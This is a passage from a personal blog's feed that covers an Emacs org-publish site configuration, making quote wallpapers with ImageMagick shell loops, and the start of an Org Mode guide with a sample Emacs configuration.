<h3 id="org3bf13d2"><span class="section-number-3">8.2.</span> <a href="#org3bf13d2">Blog-posts</a></h3>
<div class="outline-text-3" id="text-8-2">
<div class="org-src-container">
<pre class="src src-elisp">(list <span class="org-string">"blog-posts"</span>
</pre>
</div>

<p>
This is crucial.
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:base-directory</span> posts-dir
<span class="org-builtin">:base-extension</span> <span class="org-string">"org"</span>
<span class="org-builtin">:exclude</span> <span class="org-string">".*index.org"</span>
</pre>
</div>

<p>
Recursive once again
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:recursive</span> t
</pre>
</div>

<p>
Another difference
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:html-link-up</span> <span class="org-string">"./index.html"</span>
<span class="org-builtin">:html-link-home</span> <span class="org-string">"/index.html"</span>
</pre>
</div>

<p>
Yup, I decided against that
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-comment-delimiter">;     </span><span class="org-comment">:auto-sitemap t</span>
<span class="org-comment-delimiter">;     </span><span class="org-comment">:sitemap-filename "sitemap.org"</span>
<span class="org-comment-delimiter">;     </span><span class="org-comment">:sitemap-title "Sitemap"</span>
<span class="org-comment-delimiter">;     </span><span class="org-comment">:sitemap-sort-files 'anti-chronologically</span>
<span class="org-comment-delimiter">;     </span><span class="org-comment">:sitemap-date-format "Published: %a %b %d %Y"</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:html-postamble</span>  comments-postamble
<span class="org-builtin">:publishing-directory</span> posts-public-dir
<span class="org-builtin">:publishing-function</span> 'org-html-publish-to-html
</pre>
</div>

<p>
The following settings actually do not need further explanation
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-builtin">:with-author</span> t           <span class="org-comment-delimiter">;; </span><span class="org-comment">Don't include author name</span>
<span class="org-builtin">:with-creator</span> t            <span class="org-comment-delimiter">;; </span><span class="org-comment">Include Emacs and Org versions in footer</span>
<span class="org-builtin">:with-drawers</span> t
<span class="org-builtin">:with-date</span> t
<span class="org-builtin">:headline-level</span> 4
<span class="org-builtin">:with-toc</span> t                <span class="org-comment-delimiter">;; </span><span class="org-comment">Include a table of contents</span>
<span class="org-builtin">:section-numbers</span> nil       <span class="org-comment-delimiter">;; </span><span class="org-comment">Don't include section numbers</span>
<span class="org-builtin">:time-stamp-file</span> nil)
</pre>
</div>
</div>
</div>
<div id="outline-container-org63ad260" class="outline-3">
<h3 id="org63ad260"><span class="section-number-3">8.3.</span> <a href="#org63ad260">Images</a></h3>
<div class="outline-text-3" id="text-8-3">
<p>
You may have already noticed that the two previous projects contain only my org
files, even though a website is so much more than html ( to which org will get
converted ). There are other types of media, such as images and css elements. In
order to get these published ( contained in <code>/content/images</code> and <code>/content/src</code>
respectively) we use the <code>org-publish-attachment</code> function, which essentially
copies the specified files to the target directory
</p>

<div class="org-src-container">
<pre class="src src-elisp">(list <span class="org-string">"Images"</span>
             <span class="org-builtin">:base-directory</span> posts-dir
             <span class="org-builtin">:base-extension</span> <span class="org-string">"png"</span>
             <span class="org-builtin">:publishing-directory</span> posts-public-dir
             <span class="org-builtin">:publishing-function</span> 'org-blog-publish-attachment
             <span class="org-builtin">:recursive</span> t
             )
</pre>
</div>
</div>
</div>
<div id="outline-container-orgde8fd10" class="outline-3">
<h3 id="orgde8fd10"><span class="section-number-3">8.4.</span> <a href="#orgde8fd10">Static</a></h3>
<div class="outline-text-3" id="text-8-4">
<div class="org-src-container">
<pre class="src src-elisp">(list <span class="org-string">"Website static stuff"</span>
      <span class="org-builtin">:base-directory</span> src-dir
      <span class="org-builtin">:base-extension</span> <span class="org-string">"html</span><span class="org-string"><span class="org-regexp-grouping-backslash">\\</span></span><span class="org-string"><span class="org-regexp-grouping-construct">|</span></span><span class="org-string">css</span><span class="org-string"><span class="org-regexp-grouping-backslash">\\</span></span><span class="org-string"><span class="org-regexp-grouping-construct">|</span></span><span class="org-string">ico"</span>
      <span class="org-builtin">:publishing-directory</span> src-public-dir
      <span class="org-builtin">:publishing-function</span> 'org-publish-attachment
      <span class="org-builtin">:recursive</span> t
      )
)
)



</pre>
</div>

<p>
And another function to help with images
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-comment-delimiter">;; </span><span class="org-comment">Automatic image conversion</span>
(<span class="org-keyword">defun</span> <span class="org-function-name">org-blog-publish-attachment</span> (plist filename pub-dir)
  <span class="org-doc">"Publish a file with no transformation of any kind.</span>
<span class="org-doc">FILENAME is the filename of the Org file to be published.  PLIST</span>
<span class="org-doc">is the property list for the given project.  PUB-DIR is the</span>
<span class="org-doc">publishing directory.</span>
<span class="org-doc">Take care of minimizing the pictures using imagemagick.</span>
<span class="org-doc">Return output file name."</span>
  (<span class="org-keyword">unless</span> (file-directory-p pub-dir)
    (make-directory pub-dir t))
  (<span class="org-keyword">or</span> (equal (expand-file-name (file-name-directory filename))
             (file-name-as-directory (expand-file-name pub-dir)))
      (<span class="org-keyword">let</span> ((dst-file (expand-file-name (file-name-nondirectory filename) pub-dir)))
        (<span class="org-keyword">if</span> (string-match-p <span class="org-string">".*\\.</span><span class="org-string"><span class="org-regexp-grouping-backslash">\\</span></span><span class="org-string"><span class="org-regexp-grouping-construct">(</span></span><span class="org-string">png</span><span class="org-string"><span class="org-regexp-grouping-backslash">\\</span></span><span class="org-string"><span class="org-regexp-grouping-construct">|</span></span><span class="org-string">jpg</span><span class="org-string"><span class="org-regexp-grouping-backslash">\\</span></span><span class="org-string"><span class="org-regexp-grouping-construct">|</span></span><span class="org-string">gif</span><span class="org-string"><span class="org-regexp-grouping-backslash">\\</span></span><span class="org-string"><span class="org-regexp-grouping-construct">)</span></span><span class="org-string">$"</span> filename)
            (shell-command (format <span class="org-string">"convert %s -resize 800x800\\&gt; +dither -colors 16 -depth 4 %s"</span> filename dst-file))
          (copy-file filename dst-file t)))))

</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-orga44b413" class="outline-2">
<h2 id="orga44b413"><span class="section-number-2">9.</span> <a href="#orga44b413">The End - Taking Action</a></h2>
<div class="outline-text-2" id="text-9">
<div class="org-src-container">
<pre class="src src-elisp">
(org-publish-all t)

</pre>
</div>
</div>
</div>
<div id="outline-container-org0915e1d" class="outline-2">
<h2 id="org0915e1d"><span class="section-number-2">10.</span> <a href="#org0915e1d">Org-static-blog for index creation</a></h2>
<div class="outline-text-2" id="text-10">
<p>
I tried removing this section, but in great terror I realized how
naive I was when I wrote this. It needs the variables that I set in
here.
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(load (expand-file-name <span class="org-string">"index-generator.el"</span> default-directory))
(chatziiola/org-static-blog-assemble-index-no-content)

<span class="org-comment-delimiter">;;; </span><span class="org-comment">build-site.el ends here.</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-orgbca57c8" class="outline-2">
<h2 id="orgbca57c8"><span class="section-number-2">11.</span> <a href="#orgbca57c8">Sources of inspiration</a></h2>
<div class="outline-text-2" id="text-11">
<p>
This is intended to be the last section of my literate config file. It is
devoted to all the websites that inspired me to take action towards improving my
site:
</p>
<ul class="org-ul">
<li><a href="https://her.esy.fun/posts/0001-new-blog/index.html">https://her.esy.fun/posts/0001-new-blog/index.html</a></li>
</ul>
</div>
</div>
]]>
</description></item>
<item>
<title>Creating inspirational wallpapers from the comfort of your terminal</title>
<link>posts/20230105_creating_inspirational_wallpapers_from_the_comfort_of_your_terminal.html</link>
<pubDate>Thu, 05 Jan 2023 13:25:00 +0200</pubDate>
<guid>posts/20230105_creating_inspirational_wallpapers_from_the_comfort_of_your_terminal.html</guid>
<description>
<![CDATA[<p>
The first two months of the year are always somewhat difficult if you are an
undergraduate in Greece, since the final exams of the Fall Semester take place
and&#x2026; you have to <a href="https://www.youtube.com/watch?v=M6JRD-ubxR4&amp;ab_channel=asasyn151">ruuuuuuun</a>. Yet, we must press on, no matter how easily one may
feel demotivated.
</p>

<p>
What I, personally, find most difficult, is taking a step back and relaxing. No
matter how many hours I put in, or how I push myself, university exams for some
reason mess with my well being. It most probably is a direct result of the first
year being through Zoom calls, making it difficult to participate and cultivate
a genuine interest in my courses. I&rsquo;m working on it.
</p>

<p>
Since I spend most of my time studying on my computer (a process which I would I
will explore in a later post), I decided to create some inspirational
wallpapers.
</p>

<p>
Not so obviously, a graphical interface will not be necessary for this task.
</p>
<div id="outline-container-orge07e6eb" class="outline-2">
<h2 id="orge07e6eb"><span class="section-number-2">1.</span> <a href="#orge07e6eb">The process</a></h2>
<div class="outline-text-2" id="text-1">
<ol class="org-ol">
<li><p>
Make sure that you have the proper package installed
</p>
<div class="org-src-container">
<pre class="src src-bash">sudo apt install imagemagick <span class="org-comment-delimiter"># </span><span class="org-comment">Good ol' linux</span>
brew install imagemagick     <span class="org-comment-delimiter"># </span><span class="org-comment">Well, what can I say here</span>
</pre>
</div></li>
<li>Find the images you want. Ideally
<ul class="org-ul">
<li>High resolution. I had a major problem here and this is the main reason I&rsquo;m
posting today. I may need to come back here when I eventually spend some
more time to find quality pictures</li>
<li>I like the black and white style due to minimalism and simplicity</li>
<li>You may want to use google dorking, even though it was not really helpful
in the end</li>
</ul></li>
<li>Find the quotes you want
<ul class="org-ul">
<li>Try using smaller quotes</li>
<li>If you settle on quotes that you see that exceed the boundaries of your
image use &ldquo;\n&rdquo; to break the quote in lines</li>
</ul></li>
<li><p>
Copy the following command to your terminal
</p>
<div class="org-src-container">
<pre class="src src-bash">convert &lt;input image&gt; -font Iosevka -pointsize 24 -gravity Center -interline-spacing 26 -fill white -annotate 0 <span class="org-string">"&lt;quote&gt;"</span> &lt;output image&gt;
</pre>
</div>
<p>
Explaining the options used here:
</p>
<ul class="org-ul">
<li><code>&lt;input image&gt;</code> self-descriptive</li>
<li><code>-font</code> self-descriptive</li>
<li><code>-pointsize</code> the size of the letters of your font</li>
<li><code>-gravity</code> the location in which the text will be placed
<ul class="org-ul">
<li>Center, South, West, North, East</li>
</ul></li>
<li><code>-interline-spacing</code>, the space between the lines</li>
<li><code>-fill</code>, font color</li>
<li><code>-annotate</code>, essentially the function we want to perform: adding the quote
on top of the image</li>
<li><code>&lt;output image&gt;</code>
There are some other options I have explored yet did not work the way I</li>
</ul>
<p>
wanted:
</p></li>
<li><code>-warp</code>, not supported by my <code>magick</code> version, even though it should be
<ul class="org-ul">
<li><code>-split</code>, It inserts a solid color part in the image, effectively ruining the
images we have selected in 2.</li>
</ul></li>
<li>Then, for every image:
<ul class="org-ul">
<li>Substitute input, output and quote. Following the tips in quotes above may
be necessary to customize your output wallpapers</li>
<li>If you are kind lazy and want to put many quotes on the same images you
could modify what</li>
</ul></li>
<li>It&rsquo;s done.</li>
</ol>
</div>
</div>
<div id="outline-container-org0ed96be" class="outline-2">
<h2 id="org0ed96be"><span class="section-number-2">2.</span> <a href="#org0ed96be">My way</a></h2>
<div class="outline-text-2" id="text-2">
<p>
It&rsquo;s not perfect but&#x2026;
</p>

<p>
Also, <b>DISCLAIMER</b>:
I have found most of these quotes online on goodreads or elsewhere. They may or
may not have been said by the people I attribute them to. Even if they were not,
their purpose to me is inspiration and hopefully, getting some wisdom out of them.
</p>
</div>
<div id="outline-container-org7d12023" class="outline-3">
<h3 id="org7d12023"><span class="section-number-3">2.1.</span> <a href="#org7d12023">Schwarzenegger quotes</a></h3>
<div class="outline-text-3" id="text-2-1">
<div class="org-src-container">
<pre class="src src-bash"><span class="org-builtin">cd</span> ~/Downloads
<span class="org-comment-delimiter"># </span><span class="org-comment">Notice how I have '\n' inside of my quotes</span>
<span class="org-keyword">for</span> quote<span class="org-keyword"> in</span> <span class="org-sh-escaped-newline">\</span>
    <span class="org-string">"The resistance that you fight in life can only build a strong character."</span><span class="org-sh-escaped-newline">\</span>
    <span class="org-string">"If you don&#8217;t find the time ,\n if you don&#8217;t do the work,\n you don&#8217;t get the results."</span><span class="org-sh-escaped-newline">\</span>
    <span class="org-string">"Failure is not an option"</span><span class="org-sh-escaped-newline">\</span>
    <span class="org-string">"You can&#8217;t climb the ladder of success with your hands in your pockets."</span><span class="org-sh-escaped-newline">\</span>
    <span class="org-string">"Life may be full of pain but that&#8217;s not an excuse to give up."</span>
<span class="org-keyword">do</span>
     <span class="org-comment-delimiter"># </span><span class="org-comment">Modify the field used to be a more descriptive filename. It obviously is not perfect, but it is usable</span>
    <span class="org-variable-name">output_filename</span>=wallpapers_withquote/wallpaper_scharzi-$(<span class="org-builtin">echo</span> $<span class="org-variable-name">quote</span> | awk <span class="org-string">'{print $5}'</span>).png
    convert wallpapers_prequote/schwarzi.png -font Iosevka -pointsize 30 -gravity Center -interline-spacing 31 -fill white -annotate 0 <span class="org-string">"$quote"</span> <span class="org-string">"$output_filename"</span>
     <span class="org-comment-delimiter"># </span><span class="org-comment">Useful for previewing the files right after creation</span>
    open $<span class="org-variable-name">output_filename</span>
  <span class="org-keyword">done</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-orgc668091" class="outline-3">
<h3 id="orgc668091"><span class="section-number-3">2.2.</span> <a href="#orgc668091">Feynman quotes</a></h3>
<div class="outline-text-3" id="text-2-2">
<div class="org-src-container">
<pre class="src src-bash"><span class="org-builtin">cd</span> ~/Downloads
<span class="org-comment-delimiter"># </span><span class="org-comment">Notice how I have '\n' inside of my quotes</span>
<span class="org-keyword">for</span> quote<span class="org-keyword"> in</span> <span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"The first principle is that you must not fool yourself and you are the easiest person to fool"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"I learned very early the difference between knowing the name of something and knowing something"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"I would rather have questions that can't be answered than answers that can't be questioned."</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"Physics isn't the most important thing. Love is"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"We are trying to prove ourselves wrong as quickly as possible, because only in that way can we find progress"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"I think it's much more interesting to live not knowing than to have answers which might be wrong"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"All the time you're saying to yourself, 'I could do that, but I won't,' &#8212; which is just another way of saying that you can't"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"For a successful technology, reality must take precedence over public relations, for nature cannot be fooled"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"What I cannot create, I do not understand."</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"&#8220;What Do You Care What Other People Think?&#8221;"</span>
<span class="org-keyword">do</span>
<span class="org-comment-delimiter"># </span><span class="org-comment">Maybe this is a better approach than the previous one, however the filenames are pretty long </span>
    <span class="org-variable-name">output_filename</span>=<span class="org-string">"wallpapers_withquote/wallpaper_feynman-$quote.jpg"</span>
    convert wallpapers_prequote/feynman-wide.jpg -font Iosevka -pointsize 30 -gravity Center -interline-spacing 31 -fill white -annotate 0 <span class="org-string">"$quote"</span> <span class="org-string">"$output_filename"</span>
     <span class="org-comment-delimiter"># </span><span class="org-comment">Useful for previewing the files right after creation</span>
    open <span class="org-string">"$output_filename"</span>
  <span class="org-keyword">done</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org802509d" class="outline-3">
<h3 id="org802509d"><span class="section-number-3">2.3.</span> <a href="#org802509d">Gates quotes</a></h3>
<div class="outline-text-3" id="text-2-3">
<div class="org-src-container">
<pre class="src src-bash"><span class="org-builtin">cd</span> ~/Downloads
<span class="org-comment-delimiter"># </span><span class="org-comment">Notice how I have '\n' inside of my quotes</span>
<span class="org-keyword">for</span> quote<span class="org-keyword"> in</span> <span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"Most people overestimate what they can do in one year and underestimate what they can do in ten years"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"Success is a lousy teacher. It seduces smart people into thinking they can't lose"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"Measuring programming progress by lines of code is like measuring aircraft building progress by weight"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"It's fine to celebrate success but it is more important to heed the lessons of failure"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"Power comes not from knowledge kept but from knowledge shared"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"I believe that if you show people the problems and you show them the solutions they will be moved to act"</span><span class="org-sh-escaped-newline">\</span>
 <span class="org-string">"But I hope you&#8217;ll spend more time and energy supporting whatever you&#8217;re in favor of than opposing whatever you&#8217;re against."</span>
<span class="org-keyword">do</span>
<span class="org-comment-delimiter"># </span><span class="org-comment">Maybe this is a better approach than the previous one, however the filenames are pretty long </span>
    <span class="org-variable-name">output_filename</span>=<span class="org-string">"wallpapers_withquote/wallpaper_gates-$quote.jpg"</span>
    convert wallpapers_prequote/gates.jpg -font Iosevka -pointsize 30 -gravity Center -interline-spacing 31 -fill white -annotate 0 <span class="org-string">"$quote"</span> <span class="org-string">"$output_filename"</span>
     <span class="org-comment-delimiter"># </span><span class="org-comment">Useful for previewing the files right after creation</span>
    open <span class="org-string">"$output_filename"</span>
  <span class="org-keyword">done</span>
</pre>
</div>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Speedrun guide to Org Mode</title>
<link>posts/20230109_notes_literate_devops_in_emacs_and_org_mode.html</link>
<pubDate>Mon, 09 Jan 2023 11:34:00 +0200</pubDate>
<guid>posts/20230109_notes_literate_devops_in_emacs_and_org_mode.html</guid>
<description>
<![CDATA[<div id="outline-container-org3dfbe1b" class="outline-2">
<h2 id="org3dfbe1b"><span class="section-number-2">1.</span> <a href="#org3dfbe1b">Commentary</a></h2>
<div class="outline-text-2" id="text-1">
<p>
This started as a set of notes on <a href="https://www.youtube.com/watch?v=dljNabciEGg&amp;list=WL&amp;index=119&amp;ab_channel=HowardAbrams">Literate Devops with Emacs</a>. I never
thought this was to be published, but it was revised on
<span class="timestamp-wrapper"><span class="timestamp">&lt;2025-03-20 Thu&gt;</span></span>, so that I can send it to a friend of mine.
</p>


<div class="note" id="orgd08b510">
<p>
Feel free to look at the <a href="https://github.com/chatziiola/chatziiola.github.io/blob/main/content/posts/20230109_notes_literate_devops_in_emacs_and_org_mode.org">source code</a> of this file, since the whole
post was written in Org Mode.
</p>

</div>
</div>
</div>
<div id="outline-container-org07f0f34" class="outline-2">
<h2 id="org07f0f34"><span class="section-number-2">2.</span> <a href="#org07f0f34">Introduction</a></h2>
<div class="outline-text-2" id="text-2">
<p>
<a href="https://orgmode.org/">Org Mode</a> is a wonderful plain text markup format. It is like markdown
on steroids, yet much more intuitive and readable.
</p>

<div class="org-src-container">
<pre class="src src-text" id="orgdcc0aec">* Header
Headers start with *, this is a *bold* word, this is /italics/

You can have custom blocks with
#+begin_src, language
echo "I am no salesman, but well, you can also *execute* scripts inline with C-c C-c"
#+end_src
while inline code looks like this ~echo Hello World~

You can have references [[cref:...]], footnotes [[fn:1]] (C-c C-x f)...


#+NAME: This is a table
| column 1   | column 2    |
|------------+-------------|
| Elementary | Dear Watson |
|            |             |

#+CAPTION: Image caption
#+attr_latex: :width 0.65\linewidth
#+attr_html: :alt It usually works out best
[[file:/the/path/to/a.img]]

Links can be efficiently inserted with C-c C-l and look like this:
[[http://chatziiola.github.io][Link]]
</pre>
</div>

<p>
The thing is that OrgMode works best from within Emacs. Extensions
exist for Nvim and other editors, but nothing even comes close. 
</p>
</div>
</div>
<div id="outline-container-org8176ceb" class="outline-2">
<h2 id="org8176ceb"><span class="section-number-2">3.</span> <a href="#org8176ceb">Org mode features</a></h2>
<div class="outline-text-2" id="text-3">
<p>
This is found somewhere in the documentation of OrgMode (but it could
have been CDLatex for <code>`</code>) - in any case it stands true:
</p>

<div class="note" id="org76efa14">
<p>
When in doubt use <code>C-c</code> - (it is the default prefix for OrgMode shortcuts)
</p>

</div>
</div>
<div id="outline-container-org6c1f9ae" class="outline-3">
<h3 id="org6c1f9ae"><span class="section-number-3">3.1.</span> <a href="#org6c1f9ae">Writing code</a></h3>
<div class="outline-text-3" id="text-3-1">
<ol class="org-ol">
<li>You can write code easily within source blocks. You can write
<code>#+begin_src &lt;lang&gt;</code> , followed by <code>#+end_src</code>, but the simpler
solution here is to use <code>C-c C-,</code>. A menu then spawns showing you the
different environments you can use:</li>
<li>You can edit the source block more efficiently, taking advantage of
your programming configuration by using <code>C-c '</code> while inside it.</li>
<li>After you have finished writing everything, execute it with <code>C-c C-c</code></li>
<li>The RESULTS will be shown in buffer</li>
</ol>

<div class="org-src-container">
<pre class="src src-sh">brew search pyenv
</pre>
</div>

<div class="org-src-container">
<pre class="src src-text">#+RESULTS:
| pyenv                   |
| pyenv-ccache            |
| pyenv-pip-migrate       |
| pyenv-virtualenv        |
| pyenv-virtualenvwrapper |
| pyenv-which-ext         |
| plenv                   |
| pipenv                  |
</pre>
</div>
</div>
</div>
<div id="outline-container-orgb49083f" class="outline-3">
<h3 id="orgb49083f"><span class="section-number-3">3.2.</span> <a href="#orgb49083f">Customizing the source blocks</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
By adding options to the first line of the source block one can modify
its behavior. An example of that is the following, making sure that
when exporting this file (see the exporting section for more), only
the code block (not the results) will be exported:
</p>

<div class="org-src-container">
<pre class="src src-text">#+begin_src python3 :exports code
print("Nice ;)")
#+end_src
</pre>
</div>

<p>
You can also set the directory where the code block will be
executed<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, or set variables:
</p>
<div class="org-src-container">
<pre class="src src-text">#+begin_src sh :dir ~
pwd
#+end_src

#+RESULTS:
: /Users/sickvm
</pre>
</div>

<div class="org-src-container">
<pre class="src src-text">#+begin_src sh :var hellostring="Hello World"
echo $hellostring
#+end_src

#+RESULTS:
Hello World
</pre>
</div>
</div>
</div>
<div id="outline-container-org1037dec" class="outline-3">
<h3 id="org1037dec"><span class="section-number-3">3.3.</span> <a href="#org1037dec">Exporting</a></h3>
<div class="outline-text-3" id="text-3-3">
<p>
OrgMode files can instantly be exported to  \LaTeX, HTML, ODT(?), even
Markdown<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>. Just run <code>C-c C-e</code> to see more.
</p>

<p>
If you are interested in what an Org to HTML workflow looks like, <a href="https://chatziiola.github.io/posts/20221228_elisp-org-publish-blog-configuration.html">this
is an excellent article to have a look at</a>&#x2026; What a writer :P
</p>
</div>
</div>
<div id="outline-container-orgcf3ab41" class="outline-3">
<h3 id="orgcf3ab41"><span class="section-number-3">3.4.</span> <a href="#orgcf3ab41">Tangling</a></h3>
<div class="outline-text-3" id="text-3-4">
<p>
This is one of the best features of org mode, and in fact this is what
leads us to the next section of this article. One can use tangling so
that independent <code>begin_src</code> blocks are then (through <code>org-babel-tangle</code>)
combined to produce independent files. The next section, if tangled,
creates a minimal emacs configuration for writing in OrgMode.
</p>

<div class="org-src-container">
<pre class="src src-text">#+begin_src sh :tangle &lt;filename&gt;
</pre>
</div>

<p>
You can even set it for a whole file 
</p>
<div class="org-src-container">
<pre class="src src-text" id="orgedf4031">#+TITLE: My file
#+PROPERTY: :tangle ~/filename"


* Header
:PROPERTIES:
:header-args:elisp: :tangle "~/filename"
:END:
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org301332b" class="outline-2">
<h2 id="org301332b"><span class="section-number-2">4.</span> <a href="#org301332b">Sample-Configuration&#xa0;&#xa0;&#xa0;<span class="tag"><span class="config">config</span></span></a></h2>
<div class="outline-text-2" id="text-4">
</div>
<div id="outline-container-org4f1a020" class="outline-3">
<h3 id="org4f1a020"><span class="section-number-3">4.1.</span> <a href="#org4f1a020">Package Management</a></h3>
<div class="outline-text-3" id="text-4-1">
</div>
<div id="outline-container-org15acc1e" class="outline-4">
<h4 id="org15acc1e"><span class="section-number-4">4.1.1.</span> <a href="#org15acc1e">Straight configuration</a></h4>
<div class="outline-text-4" id="text-4-1-1">
<p>
Using <a href="https://github.com/raxod502/straight.el">straight.el</a> for package management
</p>

<p>
This snippet is necessary to load <code>bootstrap.el</code> and get straight up and running.
</p>
<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">defvar</span> <span class="org-variable-name">bootstrap-version</span>)
(<span class="org-keyword">let</span> ((bootstrap-file
       (expand-file-name <span class="org-string">"straight/repos/straight.el/bootstrap.el"</span> user-emacs-directory))
      (bootstrap-version 6))
  (<span class="org-keyword">unless</span> (file-exists-p bootstrap-file)
    (<span class="org-keyword">with-current-buffer</span>
        (url-retrieve-synchronously
         <span class="org-string">"https://raw.githubusercontent.com/radian-software/straight.el/develop/install.el"</span>
         'silent 'inhibit-cookies)
      (goto-char (point-max))
      (eval-print-last-sexp)))
  (load bootstrap-file nil 'nomessage))

</pre>
</div>

<p>
This needs to be here to avoid mismatch org version
</p>
<div class="org-src-container">
<pre class="src src-elisp">(straight-use-package 'org)
</pre>
</div>

<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">setq</span> straight-vc-git-default-clone-depth 1)
(<span class="org-keyword">setq</span> straight-recipes-gnu-elpa-use-mirror t)
</pre>
</div>

<p>
Use <code>use-package</code> forms when installing packages. This allows for the numerous
<i>pieces</i> of code to be self-dependent.
</p>
<div class="org-src-container">
<pre class="src src-elisp">(straight-use-package 'use-package)
(<span class="org-keyword">setq</span> straight-use-package-by-default t)
</pre>
</div>
</div>
</div>
<div id="outline-container-org09e689c" class="outline-4">
<h4 id="org09e689c"><span class="section-number-4">4.1.2.</span> <a href="#org09e689c">Auto Package Update</a></h4>
<div class="outline-text-4" id="text-4-1-2">
<div class="org-src-container">
<pre class="src src-elisp" id="org93ee807">
(<span class="org-keyword">use-package</span> auto-package-update
  <span class="org-builtin">:custom</span>
  (auto-package-update-interval 7)
  (auto-package-update-prompt-before-update t)
  (auto-package-update-hide-results t)
  <span class="org-builtin">:config</span>
  (auto-package-update-maybe)
  (auto-package-update-at-time <span class="org-string">"09:00"</span>))

</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org4d4e1c3" class="outline-3">
<h3 id="org4d4e1c3"><span class="section-number-3">4.2.</span> <a href="#org4d4e1c3">Evil Mode and some useful packages</a></h3>
<div class="outline-text-3" id="text-4-2">
<p>
If you are a Vim user, then <code>evil mode</code> is ideal, I can not help but
suggest it:
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="org3bdc617">
(<span class="org-keyword">use-package</span> evil
    <span class="org-builtin">:demand</span>
    <span class="org-builtin">:init</span>
        (<span class="org-keyword">setq</span> evil-want-keybinding nil)
        (<span class="org-keyword">setq</span> evil-want-C-u-scroll t)
        (<span class="org-keyword">setq</span> evil-want-integration t)
        (<span class="org-keyword">setq</span> evil-want-keybinding nil)
        (<span class="org-keyword">setq</span> evil-split-window-below t)
        (<span class="org-keyword">setq</span> evil-vsplit-window-right t)
        (<span class="org-keyword">setq</span> evil-want-C-u-scroll t)
        (<span class="org-keyword">setq</span> evil-want-C-i-jump t)
        (<span class="org-keyword">setq</span> evil-want-Y-yank-to-eol t)
    <span class="org-builtin">:config</span>
        (evil-mode 1)
        <span class="org-comment-delimiter">;; </span><span class="org-comment">No really need to set leader keys like that</span>
        (evil-set-leader 'normal (kbd <span class="org-string">"&lt;SPC&gt;"</span>))
        (evil-set-leader 'insert (kbd <span class="org-string">"M-&lt;SPC&gt;"</span>))
        <span class="org-comment-delimiter">;; </span><span class="org-comment">Use visual line motions even outside of visual-line-mode buffers</span>
        (evil-global-set-key 'motion <span class="org-string">"j"</span> 'evil-next-visual-line)
        (evil-global-set-key 'motion <span class="org-string">"k"</span> 'evil-previous-visual-line)
)

</pre>
</div>
</div>
<div id="outline-container-org31e3682" class="outline-4">
<h4 id="org31e3682"><span class="section-number-4">4.2.1.</span> <a href="#org31e3682">Evil Collection</a></h4>
<div class="outline-text-4" id="text-4-2-1">
<p>
Evil collection is a collection of multiple useful keybindings. Just like it is
shown in the following snippet, I have decided against using the default
<code>evil-collection-mode-list</code>, mainly to avoid unwanted behavior in certain modes. I
have decided to keep evil collection only on certain modes (the ones described).
</p>

<div class="org-src-container">
<pre class="src src-elisp" id="org002ecc7">(<span class="org-keyword">use-package</span> evil-collection
  <span class="org-builtin">:after</span> evil
  <span class="org-builtin">:config</span>
  (<span class="org-keyword">let</span> ((evil-collection-mode-list 
         '(org help man info helpful imenu imenu-list corfu popup (magit magit-repos
         magit-submodule magit-section magit-todos) <span class="org-warning">org-roam git dired flycheck</span>
         (pdf pdfview) doc-view eldoc python hackernews (term term mult-term)
         (which-key))))
    (evil-collection-init))
  )

</pre>
</div>

<p>
This is for commenting out text as in vim
</p>
<div class="org-src-container">
<pre class="src src-elisp" id="org832dd10">(<span class="org-keyword">use-package</span> evil-commentary
  <span class="org-builtin">:ensure</span> t
  <span class="org-builtin">:config</span>
  (global-unset-key (kbd <span class="org-string">"C-x C-;"</span>)) <span class="org-comment-delimiter">;; </span><span class="org-comment">;Do not use the default</span>
  (evil-commentary-mode)) <span class="org-comment-delimiter">;; </span><span class="org-comment">Enables gc by default</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-orgd076cba" class="outline-4">
<h4 id="orgd076cba"><span class="section-number-4">4.2.2.</span> <a href="#orgd076cba">Keyboard</a></h4>
<div class="outline-text-4" id="text-4-2-2">
<p>
The mode displays the key bindings following your currently entered incomplete command  in a popup.
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">use-package</span> which-key
    <span class="org-builtin">:config</span> (which-key-mode))

</pre>
</div>
</div>
</div>
<div id="outline-container-org0d3413a" class="outline-4">
<h4 id="org0d3413a"><span class="section-number-4">4.2.3.</span> <a href="#org0d3413a">Clipboard</a></h4>
<div class="outline-text-4" id="text-4-2-3">
<p>
